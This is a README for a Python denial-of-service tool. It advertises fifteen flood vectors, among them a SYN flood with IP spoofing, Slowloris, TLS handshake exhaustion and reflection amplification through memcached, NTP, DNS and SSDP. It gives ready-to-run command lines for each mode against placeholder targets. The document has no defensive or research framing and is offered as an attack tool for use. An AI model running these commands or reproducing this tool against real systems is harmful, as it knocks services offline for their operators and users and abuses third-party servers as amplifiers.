# Features:

 15 attack vectors across L3/L4/L7
 Raw socket SYN flood with IP spoofing
 Slowloris holds 500+ sockets with keepalive headers
 TLS exhaustion burns server SSL handshakes
 Amplification via memcached/NTP/DNS/SSDP protocols
 Mixed mode fires UDP + TCP + SYN + ICMP simultaneously
 Cache bypass with rotating query params
 Random User-Agent rotation
 Live PPS/Mbps stats display
 Thread pool scaling up to 500+ workers
Requirements: Python 3.6+ · Root for raw sockets (syn, icmp, xmas, null, fin) · No external dependencies


# SYN flood (requires root)
```
sudo python3 ddos.py -t 192.168.1.100 -p 80 -d 60 -T 200 -v syn```

# UDP flood
```
python3 ddos.py -t target.com -p 53 -d 120 -T 500 -v udp```

# HTTP GET flood
```
python3 ddos.py -t https://target.com -d 300 -T 300 -v http```

# Slowloris (low bandwidth, high impact)
```
python3 ddos.py -t http://target.com -d 600 -T 500 -v slowloris```

# Mixed multi-vector
```
sudo python3 ddos.py -t 10.0.0.1 -p 80 -d 60 -v mixed```

# TLS exhaustion
```
python3 ddos.py -t https://target.com -p 443 -d 60 -T 100 -v tls```

# Amplification
```
python3 ddos.py -t 1.2.3.4 -d 60 -T 50 -v amp```
